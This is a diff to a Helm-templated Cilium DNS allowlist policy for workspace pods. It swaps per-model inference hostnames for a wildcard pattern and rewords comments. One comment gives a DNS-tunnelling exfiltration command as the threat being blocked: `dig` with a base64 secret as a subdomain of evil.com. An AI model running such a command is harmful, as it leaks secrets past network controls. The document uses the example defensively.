@@ -28,8 +28,8 @@
 # The L7 allowlist closes the DNS-tunneling exfil vector: without it, a
 # workspace can `dig <base64-secret>.evil.com @kube-dns` and leak data
 # through the resolver chain even with no external IP egress reachable.
-# Only relay-controller, this workspace's tool pods, and its warm model
-# Services are forwarded; all other DNS queries drop at the Cilium L7
+# Only relay-controller, this workspace's tool pods, and the tenant's warm
+# model Services are forwarded; all other DNS queries drop at the Cilium L7
 # proxy before reaching kube-dns.
 {{- $endpoint := .Values.harness.instructions.endpoint }}
 {{- $endpointHost := (splitList ":" $endpoint) | first }}
@@ -61,9 +61,9 @@ spec:
               # Per-call tool pods, keyed by call_id under this workspace's Service.
               - matchPattern: "*.capability-{{ $name }}.{{ $.Release.Namespace }}.svc.cluster.local"
               # Warm model Services the harness dials directly for a local call.
-              {{- range $ikey, $ientry := (default dict $.Values.inference) }}
-              - matchName: "inference-{{ $ikey }}.{{ $.Release.Namespace }}.svc.cluster.local"
-              {{- end }}
+              # Each model is its own release, so the pattern covers every
+              # `inference-<key>` Service in this namespace.
+              - matchPattern: "inference-*.{{ $.Release.Namespace }}.svc.cluster.local"
               # Object-storage endpoint the instructions-sync init container resolves to
               # pull this workspace's instruction prefix. Parameterized by the
               # endpoint value so the chart stays object-storage-generic.
@@ -109,7 +109,7 @@ spec:
     # (inference-cnp.yaml) is the sole control on which port and which two chat
     # routes it accepts; this rule only grants the harness reachability to that
     # same-tenant peer. Warm pods carry no workspace label (one Deployment per
-    # inference entry, tenant-wide), so this peer is not workspace-scoped.
+    # local model marker, tenant-wide), so this peer is not workspace-scoped.
     - toEndpoints:
         - matchLabels:
             app.kubernetes.io/component: inference
